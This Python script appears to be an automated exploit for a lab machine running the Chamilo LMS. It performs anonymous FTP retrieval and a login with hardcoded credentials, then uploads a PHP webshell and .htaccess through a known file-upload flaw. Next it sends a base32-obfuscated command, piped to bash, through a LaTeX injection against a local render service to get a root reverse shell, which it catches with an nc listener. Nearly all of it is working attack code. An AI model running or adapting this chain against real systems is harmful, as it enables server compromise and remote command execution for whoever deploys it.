import requests
import subprocess
import os
import sys
from ftplib import FTP
from pathlib import Path
import signal
import threading
import time
import random
import string




rojo = '\033[1;31m'
verde = '\033[1;32m'
amarillo = '\033[1;33m'
azul = '\033[1;36m'
reset = '\033[0m'




def dom_check():

    h = subprocess.run("cat /etc/hosts", stdout=subprocess.PIPE, shell=True)
    etc_hosts = h.stdout.decode()
    if "chamilo.dl" not in etc_hosts:
        print(f"{rojo}[{amarillo}-{rojo}] {amarillo}El dominio 'chamilo.dl' no se encuentra en el archivo /etc/hosts...")
        print(f"{rojo}[{amarillo}-{rojo}] {amarillo}Saliendo...")
        sys.exit(1)
    else:
        print(f"{rojo}[{azul}+{rojo}] {verde}El dominio 'chamilo.dl' se encuentra en el archivo /etc/hosts...")




def download_ftp_file():
    ftp_host = "chamilo.dl"
    ftp_user = "anonymous"
    ftp_pass = "created_by_maciiii___"
    ftp_file = "alumno.txt"
    local_file = "alumno.txt"


    ftp = FTP(ftp_host)
    ftp.login(ftp_user, ftp_pass)
    

    with open(local_file, 'wb') as file:
        ftp.retrbinary(f'RETR {ftp_file}', file.write)

    ftp.quit()
    
    
    archivo = Path(local_file)
    if archivo.exists():
        print(f"{rojo}[{azul}+{rojo}] {verde}Archivo descargado correctamente")
    else:
        print(f"{rojo}[{amarillo}-{rojo}] {amarillo}No se pudo obtener el archivo...")
        sys.exit(1)



def get_cookies():

    credenciales = {
        "login": "pepico",
        "password": "P@ssw0rd1",
        "submitAuth": "",
        "_qf__formLogin": ""
    }

    main_url = "http://chamilo.dl/index.php"

    l = requests.post(main_url, data=credenciales, allow_redirects=False)

    cookies = l.cookies

    ch_sid = cookies['ch_sid']
    if ch_sid != "":
        return ch_sid
    else:
        print(f"{rojo}[{amarillo}-{rojo}] {amarillo}No se pudo obtener las cookies...")
        sys.exit(1)


def make_files():
    
    length = 12
    random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    webshell = random_name + '.php'
    htaccess = ".htaccess"


    with open(webshell, 'w') as w:
        w.write("<?php system($_GET['cmd']); ?>")
    with open(htaccess, 'w') as h:
        h.write('php_flag engine on\nAcceptPathInfo on\n<FilesMatch ".+">\n    order allow,deny\n    allow from all\n</FilesMatch>')

    return webshell
    
    archivo = Path(htaccess)
    if archivo.exists():
        print(f"{rojo}[{azul}+{rojo}] {verde}Archivo '{htaccess}' creado correctamente")
    else:
        print(f"{rojo}[{amarillo}-{rojo}] {amarillo}No se pudo crear el archivo...")
        sys.exit(1)

    archivo = Path(webshell)
    if archivo.exists():
        print(f"{rojo}[{azul}+{rojo}] {verde}Archivo '{webshell}' creado correctamente")
    else:
        print(f"{rojo}[{amarillo}-{rojo}] {amarillo}No se pudo crear el archivo...")
        sys.exit(1)

def upload_webshell(ch_sid, webshell):
    frist_url = "http://chamilo.dl/main/work/work.php?cidReq=HW"
    second_url = "http://chamilo.dl/main/inc/ajax/work.ajax.php?a=upload_file&chunkAction=send"
    
    cookies = {
        "ch_sid": "%s" % (ch_sid),
    }

    files = {
        'files[0]': open(webshell, 'rb'),
        'files[1]': open('.htaccess', 'rb')
    }

    f = requests.get(frist_url, cookies=cookies)
    s = requests.post(second_url, cookies=cookies, files=files)

    webshell_path = f"http://chamilo.dl/app/cache/{webshell}"
    w = requests.get(webshell_path)
    if w.status_code != 404:
        print(f"{rojo}[{azul}+{rojo}] {verde}Webshell subida correctamente...")
        files['files[0]'].close()
        files['files[1]'].close()
        os.system(f"rm .htaccess {webshell}")
    else:
        print(f"{rojo}[{amarillo}-{rojo}] {amarillo}No se pudo subir la webshell...")
        files['files[0]'].close()
        files['files[1]'].close()
        os.system(f"rm .htaccess {webshell}")
        sys.exit(1)



def revshell(webshell):
    revshell = f"http://chamilo.dl/app/cache/{webshell}?cmd=curl%20-X%20POST%20%22http%3A%2F%2F127.0.0.1%3A6200%2Frender%22%20-d%20%27formula%3D%5Ccsname%20input%5Cendcsname%7B%7C%22echo%20MVRWQ3ZAEIRCAPRAF52XG4RPMJUW4L3DNBQXG2BAEYTCA43MMVSXAIBTEATCMIDFMNUG6IBCLFWUM6TBINAXIWLZIFXFS3KGPJQUGQLUMFJUCK2KNFAXMWSHKYZEYM2SNJRUGODYJZ5ES5KNKRRXKTKDGR4EY6SNGBGXUULHJVCDI3KNKNRT2IRAPQQGEYLTMU3DIIBNMQQD4IBPOVZXEL3CNFXC6Y3IMFZWQIBGEYQHG5LEN4QC65LTOIXWE2LOF5RWQYLTNA%3D%3D%3D%3D%3D%3D%20%7C%20base32%20-d%20%7C%20bash%22%7D%27"
    
    requests.get(revshell)

def def_handler(sig, frame):
    print(f"{rojo}[{amarillo}-{rojo}]{amarillo} Saliendo...")
    exit

def main():


    print("""\033[1;35m _______          _________ _______  _______           _     """)  
    print("""(  ___  )|\\     /|\\__   __/(  ___  )(  ____ )|\\     /|( (    /|""")
    print("""| (   ) || )   ( |   ) (   | (   ) || (    )|| )   ( ||  \\  ( |""")
    print("""| (___) || |   | |   | |   | |   | || (____)|| | _ | ||   \\ | |""")
    print("""|  ___  || |   | |   | |   | |   | ||  _____)| |( )| || (\\ \\) |""")
    print("""| (   ) || |   | |   | |   | |   | || (      | || || || | \\   |""")
    print("""| )   ( || (___) |   | |   | (___) || )      | () () || )  \\  |""")
    print("""|/     \\|(_______)   )_(   (_______)|/       (_______)|/    )_)\033[0m""")
    print("                                             \033[1;36mBy maciiii___\033[0m")
    print("\n\n")
    time.sleep(2)





    print(f"{rojo}[{azul}+{rojo}] {verde}Verificando que el dominio esté listo...")
    dom_check()
    
    
    print(f"{rojo}[{azul}+{rojo}] {verde}Obteniendo el archivo 'alumno.txt' del servidor ftp...")
    download_ftp_file()

    print(f"{rojo}[{azul}+{rojo}] {verde}Iniciando sesión en la web y obteniendo las cookies...")
    ch_sid = get_cookies()
    
    print(f"{rojo}[{azul}+{rojo}] {verde}Cookies obtenidas: {ch_sid}")


    print(f"{rojo}[{azul}+{rojo}] {verde}Creando archivos necesarios para subir la webshell...") # https://starlabs.sg/advisories/23/23-4226/
    webshell = make_files()
    

    print(f"{rojo}[{azul}+{rojo}] {verde}Subiendo la webshell...")
    upload_webshell(ch_sid, webshell)

    

    print(f"{rojo}[{azul}+{rojo}] {verde}Enviando revshell como root...")
    print(f"{rojo}")
    thread = threading.Thread(target=lambda: revshell(webshell))
    thread.start()

    signal.signal(signal.SIGINT, def_handler)
    os.system("nc -nlvp 3434")



if __name__ == '__main__':
    main()
